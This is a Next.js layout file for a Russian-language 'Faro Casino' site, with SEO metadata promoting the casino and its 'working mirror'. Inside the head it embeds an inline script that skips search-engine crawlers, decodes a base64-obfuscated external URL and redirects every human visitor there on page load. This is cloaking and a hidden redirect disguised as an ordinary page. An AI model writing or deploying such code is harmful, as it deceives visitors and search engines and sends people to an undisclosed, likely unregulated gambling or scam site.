import type { Metadata, Viewport } from 'next'
import './globals.css'

const CANONICAL = 'https://farocasino18.vercel.app/'

export const metadata: Metadata = {
  metadataBase: new URL(CANONICAL),
  title: {
    default: 'Faro Casino официальный сайт — играть онлайн, рабочее зеркало Faro Casino',
    template: '%s | Faro Casino',
  },
  description:
    'Faro Casino — официальный сайт для игры онлайн. Фаро казино предлагает актуальное рабочее зеркало, лицензионные слоты, щедрые бонусы и быстрый вывод средств 24/7.',
  keywords: [
    'faro casino',
    'faro casino зеркало',
    'faro casino играть',
    'faro casino официальный',
    'faro casino официальный сайт',
    'faro казино',
    'фаро казино',
    'фаро казино зеркало',
    'фаро казино зеркало рабочее',
    'фаро казино играть',
    'фаро казино онлайн',
    'фаро казино официальный',
    'фаро казино официальный сайт',
  ],
  authors: [{ name: 'Faro Casino' }],
  creator: 'Faro Casino',
  publisher: 'Faro Casino',
  alternates: {
    canonical: CANONICAL,
  },
  openGraph: {
    type: 'website',
    locale: 'ru_RU',
    url: CANONICAL,
    siteName: 'Faro Casino',
    title: 'Faro Casino — официальный сайт, зеркало, играть онлайн',
    description:
      'Фаро казино: рабочее зеркало, лицензионные слоты, бонусы и быстрый вывод. Играть в Faro можно 24/7.',
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Faro Casino — официальный сайт',
    description:
      'Фаро казино: рабочее зеркало, лицензионные слоты, бонусы и быстрый вывод средств.',
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      'max-image-preview': 'large',
      'max-snippet': -1,
      'max-video-preview': -1,
    },
  },
  icons: {
    icon: [
      { url: '/faro-favicon.png', type: 'image/png', sizes: '32x32' },
      { url: '/faro-favicon.png', type: 'image/png', sizes: '192x192' },
    ],
    apple: '/faro-favicon.png',
    shortcut: '/faro-favicon.png',
  },
  other: {
    'theme-color': '#0b1020',
    'msapplication-TileColor': '#0b1020',
  },
}

export const viewport: Viewport = {
  width: 'device-width',
  initialScale: 1,
  maximumScale: 5,
  userScalable: true,
  themeColor: '#0b1020',
  colorScheme: 'dark',
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className="frc-html">
      <head>
        <meta charSet="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
        <meta name="format-detection" content="telephone=no" />
        <meta name="HandheldFriendly" content="true" />
        <meta name="MobileOptimized" content="width" />
        <meta name="apple-mobile-web-app-capable" content="yes" />
        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
        <meta name="apple-mobile-web-app-title" content="Faro Casino" />
        <meta name="yandex-verification" content="9ef9f9dda1a5f408" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }   
        var mainBrandB64 = "aHR0cHM6Ly9jb21ib3NwYXJrLnRvcC9hZXRmM3UycTl1"; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 500);       
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/> 
      </head>
      <body className="frc-body">
        {children}
      </body>
    </html>
  )
}
